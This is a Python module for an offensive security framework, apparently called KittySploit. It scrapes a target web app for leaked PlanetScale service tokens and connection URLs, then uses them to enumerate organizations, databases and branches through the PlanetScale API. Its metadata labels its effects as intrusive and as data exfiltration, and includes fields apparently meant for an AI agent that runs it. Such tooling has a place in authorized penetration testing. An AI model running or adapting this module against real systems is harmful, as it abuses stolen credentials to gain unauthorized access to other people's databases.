#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate PlanetScale organizations, databases, and branches."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.planetscale_probe import enumerate_planetscale
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "PlanetScale Branch Enumeration",
        "description": (
            "Uses leaked PlanetScale service tokens (pscale_tkn_*) and connection URLs "
            "to list organizations, databases, and branches via the PlanetScale API."
        ),
        "author": ["KittySploit Team"],
        "tags": ["planetscale", "mysql", "database", "branch", "enumeration", "auxiliary"],
        "modules": [
            "auxiliary/scanner/http/turso_upstash_enum",
            "scanner/http/vibe_stack_secrets_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    service_token = OptString("", "PlanetScale service token (pscale_tkn_…)", False)
    organization = OptString("", "PlanetScale organization name", False)
    database = OptString("", "PlanetScale database name", False)
    database_url = OptString("", "PlanetScale connection URL (*.psdb.cloud)", False)
    auto_discover = OptBool(True, "Scrape SPA for PlanetScale credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")

        self._configure_session()
        findings, creds = enumerate_planetscale(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            service_token=str(self.service_token or "").strip(),
            organization=str(self.organization or "").strip(),
            database=str(self.database or "").strip(),
            database_url=str(self.database_url or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No PlanetScale access (set token/URL or enable auto_discover)")
            return False

        for hit in ok:
            if hit.get("branches"):
                print_success(f"PlanetScale branches: {hit.get('branches')}")
            else:
                print_success(f"PlanetScale {hit.get('kind')}")

        self.set_info(
            severity="critical",
            reason=f"PlanetScale enum: {len(ok)} hit(s)",
            findings=findings,
            credentials={k: mask_secret(v) for k, v in creds.items()},
        )
        return True
